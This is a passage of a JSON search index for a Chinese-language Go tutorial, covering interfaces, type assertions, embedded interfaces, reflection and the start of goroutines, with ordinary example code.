{\nfmt.Printf(\"Hi, I am %s, I work at %s. Call me on %s\\n\", e.name,\ne.company, e.phone) //\u6b64\u53e5\u53ef\u4ee5\u5206\u6210\u591a\u884c\n}\n\n//Student\u5b9e\u73b0BorrowMoney\u65b9\u6cd5\nfunc (s *Student) BorrowMoney(amount float32) {\ns.loan += amount // (again and again and...)\n}\n\n//Employee\u5b9e\u73b0SpendSalary\u65b9\u6cd5\nfunc (e *Employee) SpendSalary(amount float32) {\ne.money -= amount // More vodka please!!! Get me through the day!\n}\n\n// \u5b9a\u4e49interface\ntype Men interface {\nSayHi()\nSing(lyrics string)\nGuzzle(beerStein string)\n}\n\ntype YoungChap interface {\nSayHi()\nSing(song string)\nBorrowMoney(amount float32)\n}\n\ntype ElderlyGent interface {\nSayHi()\nSing(song string)\nSpendSalary(amount float32)\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0cinterface\u53ef\u4ee5\u88ab\u4efb\u610f\u7684\u5bf9\u8c61\u5b9e\u73b0\u3002\u6211\u4eec\u770b\u5230\u4e0a\u9762\u7684Men interface\u88abHuman\u3001Student\u548cEmployee\u5b9e\u73b0\u3002\u540c\u7406\uff0c\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u591a\u4e2ainterface\uff0c\u4f8b\u5982\u4e0a\u9762\u7684Student\u5b9e\u73b0\u4e86Men\u548cYoungChap\u4e24\u4e2ainterface\u3002</p> <p>\u6700\u540e\uff0c\u4efb\u610f\u7684\u7c7b\u578b\u90fd\u5b9e\u73b0\u4e86\u7a7ainterface(\u6211\u4eec\u8fd9\u6837\u5b9a\u4e49\uff1ainterface{})\uff0c\u4e5f\u5c31\u662f\u5305\u542b0\u4e2amethod\u7684interface\u3002</p>"},{"location":"02.6/#interface_3","title":"interface\u503c","text":"<p>\u90a3\u4e48interface\u91cc\u9762\u5230\u5e95\u80fd\u5b58\u4ec0\u4e48\u503c\u5462\uff1f\u5982\u679c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2ainterface\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u8fd9\u4e2a\u53d8\u91cf\u91cc\u9762\u53ef\u4ee5\u5b58\u5b9e\u73b0\u8fd9\u4e2ainterface\u7684\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61\u3002\u4f8b\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2aMen interface\u7c7b\u578b\u7684\u53d8\u91cfm\uff0c\u90a3\u4e48m\u91cc\u9762\u53ef\u4ee5\u5b58Human\u3001Student\u6216\u8005Employee\u503c\u3002</p> <p>\u56e0\u4e3am\u80fd\u591f\u6301\u6709\u8fd9\u4e09\u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u5305\u542bMen\u7c7b\u578b\u5143\u7d20\u7684slice\uff0c\u8fd9\u4e2aslice\u53ef\u4ee5\u88ab\u8d4b\u4e88\u5b9e\u73b0\u4e86Men\u63a5\u53e3\u7684\u4efb\u610f\u7ed3\u6784\u7684\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u548c\u6211\u4eec\u4f20\u7edf\u610f\u4e49\u4e0a\u9762\u7684slice\u6709\u6240\u4e0d\u540c\u3002</p> <p>\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50: <pre><code>package main\n\nimport \"fmt\"\n\ntype Human struct {\nname string\nage int\nphone string\n}\n\ntype Student struct {\nHuman //\u533f\u540d\u5b57\u6bb5\nschool string\nloan float32\n}\n\ntype Employee struct {\nHuman //\u533f\u540d\u5b57\u6bb5\ncompany string\nmoney float32\n}\n\n//Human\u5b9e\u73b0SayHi\u65b9\u6cd5\nfunc (h Human) SayHi() {\nfmt.Printf(\"Hi, I am %s you can call me on %s\\n\", h.name, h.phone)\n}\n\n//Human\u5b9e\u73b0Sing\u65b9\u6cd5\nfunc (h Human) Sing(lyrics string) {\nfmt.Println(\"La la la la...\", lyrics)\n}\n\n//Employee\u91cd\u8f7dHuman\u7684SayHi\u65b9\u6cd5\nfunc (e Employee) SayHi() {\nfmt.Printf(\"Hi, I am %s, I work at %s. Call me on %s\\n\", e.name,\ne.company, e.phone)\n}\n\n// Interface Men\u88abHuman,Student\u548cEmployee\u5b9e\u73b0\n// \u56e0\u4e3a\u8fd9\u4e09\u4e2a\u7c7b\u578b\u90fd\u5b9e\u73b0\u4e86\u8fd9\u4e24\u4e2a\u65b9\u6cd5\ntype Men interface {\nSayHi()\nSing(lyrics string)\n}\n\nfunc main() {\nmike := Student{Human{\"Mike\", 25, \"222-222-XXX\"}, \"MIT\", 0.00}\npaul := Student{Human{\"Paul\", 26, \"111-222-XXX\"}, \"Harvard\", 100}\nsam := Employee{Human{\"Sam\", 36, \"444-222-XXX\"}, \"Golang Inc.\", 1000}\ntom := Employee{Human{\"Tom\", 37, \"222-444-XXX\"}, \"Things Ltd.\", 5000}\n\n//\u5b9a\u4e49Men\u7c7b\u578b\u7684\u53d8\u91cfi\nvar i Men\n\n//i\u80fd\u5b58\u50a8Student\ni = mike\nfmt.Println(\"This is Mike, a Student:\")\ni.SayHi()\ni.Sing(\"November rain\")\n\n//i\u4e5f\u80fd\u5b58\u50a8Employee\ni = tom\nfmt.Println(\"This is tom, an Employee:\")\ni.SayHi()\ni.Sing(\"Born to be wild\")\n\n//\u5b9a\u4e49\u4e86slice Men\nfmt.Println(\"Let's use a slice of Men and see what happens\")\nx := make([]Men, 3)\n//\u8fd9\u4e09\u4e2a\u90fd\u662f\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20\uff0c\u4f46\u662f\u4ed6\u4eec\u5b9e\u73b0\u4e86interface\u540c\u4e00\u4e2a\u63a5\u53e3\nx[0], x[1], x[2] = paul, sam, mike\n\nfor _, value := range x{\nvalue.SayHi()\n}\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u4f60\u4f1a\u53d1\u73b0interface\u5c31\u662f\u4e00\u7ec4\u62bd\u8c61\u65b9\u6cd5\u7684\u96c6\u5408\uff0c\u5b83\u5fc5\u987b\u7531\u5176\u4ed6\u975einterface\u7c7b\u578b\u5b9e\u73b0\uff0c\u800c\u4e0d\u80fd\u81ea\u6211\u5b9e\u73b0\uff0c Go\u901a\u8fc7interface\u5b9e\u73b0\u4e86duck-typing:\u5373\"\u5f53\u770b\u5230\u4e00\u53ea\u9e1f\u8d70\u8d77\u6765\u50cf\u9e2d\u5b50\u3001\u6e38\u6cf3\u8d77\u6765\u50cf\u9e2d\u5b50\u3001\u53eb\u8d77\u6765\u4e5f\u50cf\u9e2d\u5b50\uff0c\u90a3\u4e48\u8fd9\u53ea\u9e1f\u5c31\u53ef\u4ee5\u88ab\u79f0\u4e3a\u9e2d\u5b50\"\u3002</p>"},{"location":"02.6/#interface_4","title":"\u7a7ainterface","text":"<p>\u7a7ainterface(interface{})\u4e0d\u5305\u542b\u4efb\u4f55\u7684method\uff0c\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u6240\u6709\u7684\u7c7b\u578b\u90fd\u5b9e\u73b0\u4e86\u7a7ainterface\u3002\u7a7ainterface\u5bf9\u4e8e\u63cf\u8ff0\u8d77\u4e0d\u5230\u4efb\u4f55\u7684\u4f5c\u7528(\u56e0\u4e3a\u5b83\u4e0d\u5305\u542b\u4efb\u4f55\u7684method\uff09\uff0c\u4f46\u662f\u7a7ainterface\u5728\u6211\u4eec\u9700\u8981\u5b58\u50a8\u4efb\u610f\u7c7b\u578b\u7684\u6570\u503c\u7684\u65f6\u5019\u76f8\u5f53\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5b58\u50a8\u4efb\u610f\u7c7b\u578b\u7684\u6570\u503c\u3002\u5b83\u6709\u70b9\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\u7684void*\u7c7b\u578b\u3002 <pre><code>// \u5b9a\u4e49a\u4e3a\u7a7a\u63a5\u53e3\nvar a interface{}\nvar i int = 5\ns := \"Hello world\"\n// a\u53ef\u4ee5\u5b58\u50a8\u4efb\u610f\u7c7b\u578b\u7684\u6570\u503c\na = i\na = s\n</code></pre> \u4e00\u4e2a\u51fd\u6570\u628ainterface{}\u4f5c\u4e3a\u53c2\u6570\uff0c\u90a3\u4e48\u4ed6\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u8fd4\u56deinterface{},\u90a3\u4e48\u4e5f\u5c31\u53ef\u4ee5\u8fd4\u56de\u4efb\u610f\u7c7b\u578b\u7684\u503c\u3002\u662f\u4e0d\u662f\u5f88\u6709\u7528\u554a\uff01</p>"},{"location":"02.6/#interface_5","title":"interface\u51fd\u6570\u53c2\u6570","text":"<p>interface\u7684\u53d8\u91cf\u53ef\u4ee5\u6301\u6709\u4efb\u610f\u5b9e\u73b0\u8be5interface\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u8fd9\u7ed9\u6211\u4eec\u7f16\u5199\u51fd\u6570(\u5305\u62ecmethod)\u63d0\u4f9b\u4e86\u4e00\u4e9b\u989d\u5916\u7684\u601d\u8003\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49interface\u53c2\u6570\uff0c\u8ba9\u51fd\u6570\u63a5\u53d7\u5404\u79cd\u7c7b\u578b\u7684\u53c2\u6570\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1afmt.Println\u662f\u6211\u4eec\u5e38\u7528\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u4f60\u662f\u5426\u6ce8\u610f\u5230\u5b83\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u6570\u636e\u3002\u6253\u5f00fmt\u7684\u6e90\u7801\u6587\u4ef6\uff0c\u4f60\u4f1a\u770b\u5230\u8fd9\u6837\u4e00\u4e2a\u5b9a\u4e49: <pre><code>type Stringer interface {\nString() string\n}\n</code></pre> \u4e5f\u5c31\u662f\u8bf4\uff0c\u4efb\u4f55\u5b9e\u73b0\u4e86String\u65b9\u6cd5\u7684\u7c7b\u578b\u90fd\u80fd\u4f5c\u4e3a\u53c2\u6570\u88abfmt.Println\u8c03\u7528,\u8ba9\u6211\u4eec\u6765\u8bd5\u4e00\u8bd5 <pre><code>package main\nimport (\n\"fmt\"\n\"strconv\"\n)\n\ntype Human struct {\nname string\nage int\nphone string\n}\n\n// \u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5 Human \u5b9e\u73b0\u4e86 fmt.Stringer\nfunc (h Human) String() string {\nreturn \"\u2770\"+h.name+\" - \"+strconv.Itoa(h.age)+\" years -  \u2706 \" +h.phone+\"\u2771\"\n}\n\nfunc main() {\nBob := Human{\"Bob\", 39, \"000-7777-XXX\"}\nfmt.Println(\"This Human is : \", Bob)\n}\n</code></pre> \u73b0\u5728\u6211\u4eec\u518d\u56de\u987e\u4e00\u4e0b\u524d\u9762\u7684Box\u793a\u4f8b\uff0c\u4f60\u4f1a\u53d1\u73b0Color\u7ed3\u6784\u4e5f\u5b9a\u4e49\u4e86\u4e00\u4e2amethod\uff1aString\u3002\u5176\u5b9e\u8fd9\u4e5f\u662f\u5b9e\u73b0\u4e86fmt.Stringer\u8fd9\u4e2ainterface\uff0c\u5373\u5982\u679c\u9700\u8981\u67d0\u4e2a\u7c7b\u578b\u80fd\u88abfmt\u5305\u4ee5\u7279\u6b8a\u7684\u683c\u5f0f\u8f93\u51fa\uff0c\u4f60\u5c31\u5fc5\u987b\u5b9e\u73b0Stringer\u8fd9\u4e2a\u63a5\u53e3\u3002\u5982\u679c\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\uff0cfmt\u5c06\u4ee5\u9ed8\u8ba4\u7684\u65b9\u5f0f\u8f93\u51fa\u3002 <pre><code>//\u5b9e\u73b0\u540c\u6837\u7684\u529f\u80fd\nfmt.Println(\"The biggest one is\", boxes.BiggestsColor().String())\nfmt.Println(\"The biggest one is\", boxes.BiggestsColor())\n</code></pre> \u6ce8\uff1a\u5b9e\u73b0\u4e86error\u63a5\u53e3\u7684\u5bf9\u8c61\uff08\u5373\u5b9e\u73b0\u4e86Error() string\u7684\u5bf9\u8c61\uff09\uff0c\u4f7f\u7528fmt\u8f93\u51fa\u65f6\uff0c\u4f1a\u8c03\u7528Error()\u65b9\u6cd5\uff0c\u56e0\u6b64\u4e0d\u5fc5\u518d\u5b9a\u4e49String()\u65b9\u6cd5\u4e86\u3002</p>"},{"location":"02.6/#interface_6","title":"interface\u53d8\u91cf\u5b58\u50a8\u7684\u7c7b\u578b","text":"<p>\u6211\u4eec\u77e5\u9053interface\u7684\u53d8\u91cf\u91cc\u9762\u53ef\u4ee5\u5b58\u50a8\u4efb\u610f\u7c7b\u578b\u7684\u6570\u503c(\u8be5\u7c7b\u578b\u5b9e\u73b0\u4e86interface)\u3002\u90a3\u4e48\u6211\u4eec\u600e\u4e48\u53cd\u5411\u77e5\u9053\u8fd9\u4e2a\u53d8\u91cf\u91cc\u9762\u5b9e\u9645\u4fdd\u5b58\u4e86\u7684\u662f\u54ea\u4e2a\u7c7b\u578b\u7684\u5bf9\u8c61\u5462\uff1f\u76ee\u524d\u5e38\u7528\u7684\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li> <p>Comma-ok\u65ad\u8a00</p> <p>Go\u8bed\u8a00\u91cc\u9762\u6709\u4e00\u4e2a\u8bed\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u5224\u65ad\u662f\u5426\u662f\u8be5\u7c7b\u578b\u7684\u53d8\u91cf\uff1a value, ok = element.(T)\uff0c\u8fd9\u91ccvalue\u5c31\u662f\u53d8\u91cf\u7684\u503c\uff0cok\u662f\u4e00\u4e2abool\u7c7b\u578b\uff0celement\u662finterface\u53d8\u91cf\uff0cT\u662f\u65ad\u8a00\u7684\u7c7b\u578b\u3002</p> <p>\u5982\u679celement\u91cc\u9762\u786e\u5b9e\u5b58\u50a8\u4e86T\u7c7b\u578b\u7684\u6570\u503c\uff0c\u90a3\u4e48ok\u8fd4\u56detrue\uff0c\u5426\u5219\u8fd4\u56defalse\u3002</p> <p>\u8ba9\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u66f4\u52a0\u6df1\u5165\u7684\u7406\u89e3\u3002 <pre><code>    package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\n\ntype Element interface{}\ntype List [] Element\n\ntype Person struct {\nname string\nage int\n}\n\n//\u5b9a\u4e49\u4e86String\u65b9\u6cd5\uff0c\u5b9e\u73b0\u4e86fmt.Stringer\nfunc (p Person) String() string {\nreturn \"(name: \" + p.name + \" - age: \"+strconv.Itoa(p.age)+ \" years)\"\n}\n\nfunc main() {\nlist := make(List, 3)\nlist[0] = 1 // an int\nlist[1] = \"Hello\" // a string\nlist[2] = Person{\"Dennis\", 70}\n\nfor index, element := range list {\nif value, ok := element.(int); ok {\nfmt.Printf(\"list[%d] is an int and its value is %d\\n\", index, value)\n} else if value, ok := element.(string); ok {\nfmt.Printf(\"list[%d] is a string and its value is %s\\n\", index, value)\n} else if value, ok := element.(Person); ok {\nfmt.Printf(\"list[%d] is a Person and its value is %s\\n\", index, value)\n} else {\nfmt.Printf(\"list[%d] is of a different type\\n\", index)\n}\n}\n}\n</code></pre> \u662f\u4e0d\u662f\u5f88\u7b80\u5355\u554a\uff0c\u540c\u65f6\u4f60\u662f\u5426\u6ce8\u610f\u5230\u4e86\u591a\u4e2aif\u91cc\u9762\uff0c\u8fd8\u8bb0\u5f97\u6211\u524d\u9762\u4ecb\u7ecd\u6d41\u7a0b\u65f6\u8bb2\u8fc7\uff0cif\u91cc\u9762\u5141\u8bb8\u521d\u59cb\u5316\u53d8\u91cf\u3002</p> <p>\u4e5f\u8bb8\u4f60\u6ce8\u610f\u5230\u4e86\uff0c\u6211\u4eec\u65ad\u8a00\u7684\u7c7b\u578b\u8d8a\u591a\uff0c\u90a3\u4e48if else\u4e5f\u5c31\u8d8a\u591a\uff0c\u6240\u4ee5\u624d\u5f15\u51fa\u4e86\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684switch\u3002 - switch\u6d4b\u8bd5</p> <p>\u6700\u597d\u7684\u8bb2\u89e3\u5c31\u662f\u4ee3\u7801\u4f8b\u5b50\uff0c\u73b0\u5728\u8ba9\u6211\u4eec\u91cd\u5199\u4e0a\u9762\u7684\u8fd9\u4e2a\u5b9e\u73b0 <pre><code>    package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\n\ntype Element interface{}\ntype List [] Element\n\ntype Person struct {\nname string\nage int\n}\n\n//\u6253\u5370\nfunc (p Person) String() string {\nreturn \"(name: \" + p.name + \" - age: \"+strconv.Itoa(p.age)+ \" years)\"\n}\n\nfunc main() {\nlist := make(List, 3)\nlist[0] = 1 //an int\nlist[1] = \"Hello\" //a string\nlist[2] = Person{\"Dennis\", 70}\n\nfor index, element := range list{\nswitch value := element.(type) {\ncase int:\nfmt.Printf(\"list[%d] is an int and its value is %d\\n\", index, value)\ncase string:\nfmt.Printf(\"list[%d] is a string and its value is %s\\n\", index, value)\ncase Person:\nfmt.Printf(\"list[%d] is a Person and its value is %s\\n\", index, value)\ndefault:\nfmt.Println(\"list[%d] is of a different type\", index)\n}\n}\n}\n</code></pre> \u8fd9\u91cc\u6709\u4e00\u70b9\u9700\u8981\u5f3a\u8c03\u7684\u662f\uff1a<code>element.(type)</code>\u8bed\u6cd5\u4e0d\u80fd\u5728switch\u5916\u7684\u4efb\u4f55\u903b\u8f91\u91cc\u9762\u4f7f\u7528\uff0c\u5982\u679c\u4f60\u8981\u5728switch\u5916\u9762\u5224\u65ad\u4e00\u4e2a\u7c7b\u578b\u5c31\u4f7f\u7528<code>comma-ok</code>\u3002</p> </li> </ul>"},{"location":"02.6/#interface_7","title":"\u5d4c\u5165interface","text":"<p>Go\u91cc\u9762\u771f\u6b63\u5438\u5f15\u4eba\u7684\u662f\u5b83\u5185\u7f6e\u7684\u903b\u8f91\u8bed\u6cd5\uff0c\u5c31\u50cf\u6211\u4eec\u5728\u5b66\u4e60Struct\u65f6\u5b66\u4e60\u7684\u533f\u540d\u5b57\u6bb5\uff0c\u591a\u4e48\u7684\u4f18\u96c5\u554a\uff0c\u90a3\u4e48\u76f8\u540c\u7684\u903b\u8f91\u5f15\u5165\u5230interface\u91cc\u9762\uff0c\u90a3\u4e0d\u662f\u66f4\u52a0\u5b8c\u7f8e\u4e86\u3002\u5982\u679c\u4e00\u4e2ainterface1\u4f5c\u4e3ainterface2\u7684\u4e00\u4e2a\u5d4c\u5165\u5b57\u6bb5\uff0c\u90a3\u4e48interface2\u9690\u5f0f\u7684\u5305\u542b\u4e86interface1\u91cc\u9762\u7684method\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6e90\u7801\u5305container/heap\u91cc\u9762\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u5b9a\u4e49 <pre><code>type Interface interface {\nsort.Interface //\u5d4c\u5165\u5b57\u6bb5sort.Interface\nPush(x interface{}) //a Push method to push elements into the heap\nPop() interface{} //a Pop elements that pops elements from the heap\n}\n</code></pre> \u6211\u4eec\u770b\u5230sort.Interface\u5176\u5b9e\u5c31\u662f\u5d4c\u5165\u5b57\u6bb5\uff0c\u628asort.Interface\u7684\u6240\u6709method\u7ed9\u9690\u5f0f\u7684\u5305\u542b\u8fdb\u6765\u4e86\u3002\u4e5f\u5c31\u662f\u4e0b\u9762\u4e09\u4e2a\u65b9\u6cd5\uff1a <pre><code>type Interface interface {\n// Len is the number of elements in the collection.\nLen() int\n// Less returns whether the element with index i should sort\n// before the element with index j.\nLess(i, j int) bool\n// Swap swaps the elements with indexes i and j.\nSwap(i, j int)\n}\n</code></pre> \u53e6\u4e00\u4e2a\u4f8b\u5b50\u5c31\u662fio\u5305\u4e0b\u9762\u7684 io.ReadWriter \uff0c\u5b83\u5305\u542b\u4e86io\u5305\u4e0b\u9762\u7684Reader\u548cWriter\u4e24\u4e2ainterface\uff1a <pre><code>// io.ReadWriter\ntype ReadWriter interface {\nReader\nWriter\n}\n</code></pre></p>"},{"location":"02.6/#_1","title":"\u53cd\u5c04","text":"<p>Go\u8bed\u8a00\u5b9e\u73b0\u4e86\u53cd\u5c04\uff0c\u6240\u8c13\u53cd\u5c04\u5c31\u662f\u80fd\u68c0\u67e5\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u3002\u6211\u4eec\u4e00\u822c\u7528\u5230\u7684\u5305\u662freflect\u5305\u3002\u5982\u4f55\u8fd0\u7528reflect\u5305\uff0c\u5b98\u65b9\u7684\u8fd9\u7bc7\u6587\u7ae0\u8be6\u7ec6\u7684\u8bb2\u89e3\u4e86reflect\u5305\u7684\u5b9e\u73b0\u539f\u7406\uff0claws of reflection</p> <p>\u4f7f\u7528reflect\u4e00\u822c\u5206\u6210\u4e09\u6b65\uff0c\u4e0b\u9762\u7b80\u8981\u7684\u8bb2\u89e3\u4e00\u4e0b\uff1a\u8981\u53bb\u53cd\u5c04\u662f\u4e00\u4e2a\u7c7b\u578b\u7684\u503c(\u8fd9\u4e9b\u503c\u90fd\u5b9e\u73b0\u4e86\u7a7ainterface)\uff0c\u9996\u5148\u9700\u8981\u628a\u5b83\u8f6c\u5316\u6210reflect\u5bf9\u8c61(reflect.Type\u6216\u8005reflect.Value\uff0c\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8c03\u7528\u4e0d\u540c\u7684\u51fd\u6570)\u3002\u8fd9\u4e24\u79cd\u83b7\u53d6\u65b9\u5f0f\u5982\u4e0b\uff1a <pre><code>t := reflect.TypeOf(i)    //\u5f97\u5230\u7c7b\u578b\u7684\u5143\u6570\u636e,\u901a\u8fc7t\u6211\u4eec\u80fd\u83b7\u53d6\u7c7b\u578b\u5b9a\u4e49\u91cc\u9762\u7684\u6240\u6709\u5143\u7d20\nv := reflect.ValueOf(i)   //\u5f97\u5230\u5b9e\u9645\u7684\u503c\uff0c\u901a\u8fc7v\u6211\u4eec\u83b7\u53d6\u5b58\u50a8\u5728\u91cc\u9762\u7684\u503c\uff0c\u8fd8\u53ef\u4ee5\u53bb\u6539\u53d8\u503c\n</code></pre> \u8f6c\u5316\u4e3areflect\u5bf9\u8c61\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u4e86\uff0c\u4e5f\u5c31\u662f\u5c06reflect\u5bf9\u8c61\u8f6c\u5316\u6210\u76f8\u5e94\u7684\u503c\uff0c\u4f8b\u5982 <pre><code>tag := t.Elem().Field(0).Tag  //\u83b7\u53d6\u5b9a\u4e49\u5728struct\u91cc\u9762\u7684\u6807\u7b7e\nname := v.Elem().Field(0).String()  //\u83b7\u53d6\u5b58\u50a8\u5728\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u91cc\u9762\u7684\u503c\n</code></pre> \u83b7\u53d6\u53cd\u5c04\u503c\u80fd\u8fd4\u56de\u76f8\u5e94\u7684\u7c7b\u578b\u548c\u6570\u503c <pre><code>var x float64 = 3.4\nv := reflect.ValueOf(x)\nfmt.Println(\"type:\", v.Type())\nfmt.Println(\"kind is float64:\", v.Kind() == reflect.Float64)\nfmt.Println(\"value:\", v.Float())\n</code></pre> \u6700\u540e\uff0c\u53cd\u5c04\u7684\u8bdd\uff0c\u90a3\u4e48\u53cd\u5c04\u7684\u5b57\u6bb5\u5fc5\u987b\u662f\u53ef\u4fee\u6539\u7684\uff0c\u6211\u4eec\u524d\u9762\u5b66\u4e60\u8fc7\u4f20\u503c\u548c\u4f20\u5f15\u7528\uff0c\u8fd9\u4e2a\u91cc\u9762\u4e5f\u662f\u4e00\u6837\u7684\u9053\u7406\u3002\u53cd\u5c04\u7684\u5b57\u6bb5\u5fc5\u987b\u662f\u53ef\u8bfb\u5199\u7684\u610f\u601d\u662f\uff0c\u5982\u679c\u4e0b\u9762\u8fd9\u6837\u5199\uff0c\u90a3\u4e48\u4f1a\u53d1\u751f\u9519\u8bef <pre><code>var x float64 = 3.4\nv := reflect.ValueOf(x)\nv.SetFloat(7.1)\n</code></pre> \u5982\u679c\u8981\u4fee\u6539\u76f8\u5e94\u7684\u503c\uff0c\u5fc5\u987b\u8fd9\u6837\u5199 <pre><code>var x float64 = 3.4\np := reflect.ValueOf(&amp;x)\nv := p.Elem()\nv.SetFloat(7.1)\n</code></pre> \u4e0a\u9762\u53ea\u662f\u5bf9\u53cd\u5c04\u7684\u7b80\u5355\u4ecb\u7ecd\uff0c\u66f4\u6df1\u5165\u7684\u7406\u89e3\u8fd8\u9700\u8981\u81ea\u5df1\u5728\u7f16\u7a0b\u4e2d\u4e0d\u65ad\u7684\u5b9e\u8df5\u3002</p>"},{"location":"02.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u9762\u5411\u5bf9\u8c61</li> <li>\u4e0b\u4e00\u8282: \u5e76\u53d1</li> </ul>"},{"location":"02.7/","title":"2.7 \u5e76\u53d1","text":"<p>\u6709\u4eba\u628aGo\u6bd4\u4f5c21\u4e16\u7eaa\u7684C\u8bed\u8a00\uff0c\u7b2c\u4e00\u662f\u56e0\u4e3aGo\u8bed\u8a00\u8bbe\u8ba1\u7b80\u5355\uff0c\u7b2c\u4e8c\uff0c21\u4e16\u7eaa\u6700\u91cd\u8981\u7684\u5c31\u662f\u5e76\u884c\u7a0b\u5e8f\u8bbe\u8ba1\uff0c\u800cGo\u4ece\u8bed\u8a00\u5c42\u9762\u5c31\u652f\u6301\u4e86\u5e76\u884c\u3002</p>"},{"location":"02.7/#goroutine","title":"goroutine","text":"<p>goroutine\u662fGo\u5e76\u884c\u8bbe\u8ba1\u7684\u6838\u5fc3\u3002goroutine\u8bf4\u5230\u5e95\u5176\u5b9e\u5c31\u662f\u534f\u7a0b\uff0c\u4f46\u662f\u5b83\u6bd4\u7ebf\u7a0b\u66f4\u5c0f\uff0c\u5341\u51e0\u4e2agoroutine\u53ef\u80fd\u4f53\u73b0\u5728\u5e95\u5c42\u5c31\u662f\u4e94\u516d\u4e2a\u7ebf\u7a0b\uff0cGo\u8bed\u8a00\u5185\u90e8\u5e2e\u4f60\u5b9e\u73b0\u4e86\u8fd9\u4e9bgoroutine\u4e4b\u95f4\u7684\u5185\u5b58\u5171\u4eab\u3002\u6267\u884cgoroutine\u53ea\u9700\u6781\u5c11\u7684\u6808\u5185\u5b58(\u5927\u6982\u662f4~5KB)\uff0c\u5f53\u7136\u4f1a\u6839\u636e\u76f8\u5e94\u7684\u6570\u636e\u4f38\u7f29\u3002\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u53ef\u540c\u65f6\u8fd0\u884c\u6210\u5343\u4e0a\u4e07\u4e2a\u5e76\u53d1\u4efb\u52a1\u3002goroutine\u6bd4thread\u66f4\u6613\u7528\u3001\u66f4\u9ad8\u6548\u3001\u66f4\u8f7b\u4fbf\u3002</p> <p>goroutine\u662f\u901a\u8fc7Go\u7684runtime\u7ba1\u7406\u7684\u4e00\u4e2a\u7ebf\u7a0b\u7ba1\u7406\u5668\u3002goroutine\u901a\u8fc7<code>go</code>\u5173\u952e\u5b57\u5b9e\u73b0\u4e86\uff0c\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u7684\u51fd\u6570\u3002 <pre><code>go hello(a, b, c)\n</code></pre> \u901a\u8fc7\u5173\u952e\u5b57go\u5c31\u542f\u52a8\u4e86\u4e00\u4e2agoroutine\u3002\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 <pre><code>package main\n\nimport (\n\"fmt\"\n\"runtime\"\n)\n\nfunc say(s string) {\nfor i := 0; i &lt; 5; i++ {\nruntime.Gosched()\nfmt.Println(s)\n}\n}\n\nfunc main() {\ngo say(\"world\") //\u5f00\u4e00\u4e2a\u65b0\u7684Goroutines\u6267\u884c\nsay(\"hello\") //\u5f53\u524dGoroutines\u6267\u884c\n}\n\n// \u4ee5\u4e0a\u7a0b\u5e8f\u6267\u884c\u540e\u5c06\u8f93\u51fa\uff1a\n// hello\n// world\n// hello\n// world\n// hello\n// world\n// hello\n// world\n// hello\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230go\u5173\u952e\u5b57\u5f88\u65b9\u4fbf\u7684\u5c31\u5b9e\u73b0\u4e86\u5e76\u53d1\u7f16\u7a0b\u3002 \u4e0a\u9762\u7684\u591a\u4e2agoroutine\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u9762\uff0c\u5171\u4eab\u5185\u5b58\u6570\u636e\uff0c\u4e0d\u8fc7\u8bbe\u8ba1\u4e0a\u6211\u4eec\u8981\u9075\u5faa\uff1a\u4e0d\u8981\u901a\u8fc7\u5171\u4eab\u6765\u901a\u4fe1\uff0c\u800c\u8981\u901a\u8fc7\u901a\u4fe1\u6765\u5171\u4eab\u3002</p> 